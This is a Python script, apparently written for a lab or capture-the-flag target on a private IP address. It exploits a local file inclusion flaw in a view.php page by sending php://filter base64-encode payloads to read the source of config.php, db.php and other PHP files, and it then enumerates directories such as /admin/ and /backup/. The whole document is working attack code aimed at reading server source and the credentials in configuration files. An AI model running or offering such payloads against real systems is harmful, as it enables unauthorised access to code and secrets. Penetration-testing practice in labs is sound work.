import urllib.request, socket, base64
socket.setdefaulttimeout(10)
base = "http://192.168.18.132"

print("=== PHP Filter - Read Source Code ===")
# Use php://filter to read PHP source as base64
php_files = [
    "../../../var/www/html/view.php",
    "../../../var/www/html/index.php",
    "../../../var/www/html/config.php",
    "../../../var/www/html/db.php",
    "../../../var/www/html/conn.php",
    "../../../var/www/html/database.php",
]

for f in php_files:
    try:
        payload = "php://filter/convert.base64-encode/resource=" + f.replace("../../../", "")
        url = base + "/view.php?page=" + payload
        req = urllib.request.Request(url, headers={"User-Agent": "WVS/1.0"})
        resp = urllib.request.urlopen(req, timeout=5)
        content = resp.read().decode("utf-8", errors="ignore")
        if len(content) > 20:
            try:
                decoded = base64.b64decode(content).decode("utf-8", errors="ignore")
                print(f"[SOURCE] {f}:")
                print(decoded[:500])
                print("-" * 50)
            except:
                print(f"[BASE64?] {f}: {content[:100]}")
    except: pass

# Check common web directories
print("\n=== Directory Enumeration ===")
dirs = ["/css/", "/js/", "/images/", "/uploads/", "/admin/", "/backup/", 
        "/inc/", "/includes/", "/pages/", "/templates/", "/tmp/"]

for d in dirs:
    try:
        req = urllib.request.Request(base + d, headers={"User-Agent": "WVS/1.0"})
        resp = urllib.request.urlopen(req, timeout=3)
        print(f"  {d} -> 200")
    except urllib.error.HTTPError as e:
        if e.code in [403, 401]:
            print(f"  {d} -> {e.code} (exists)")
    except: pass
